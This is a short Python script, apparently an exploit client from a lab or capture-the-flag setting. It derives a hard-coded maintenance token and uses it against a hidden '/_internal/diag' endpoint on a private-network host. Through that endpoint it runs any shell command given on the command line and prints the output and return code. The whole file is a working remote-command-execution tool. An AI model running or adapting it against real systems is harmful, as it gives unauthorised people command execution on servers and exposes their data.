import hashlib, json, sys, urllib.parse, urllib.request
TARGET="172.28.0.2"
TOK=hashlib.sha256(b'EXPURGE::maintenance').hexdigest()[:32]
cmd=sys.argv[1]
u=f"http://{TARGET}/_internal/diag?action=exec&cmd="+urllib.parse.quote(cmd)
req=urllib.request.Request(u,headers={"X-Maint-Token":TOK})
try:
    d=json.load(urllib.request.urlopen(req,timeout=20))
    sys.stdout.write(d.get("stdout",""))
    sys.stderr.write(d.get("stderr",""))
    print("\n[rc]",d.get("rc"))
except Exception as e:
    print("ERR",e)
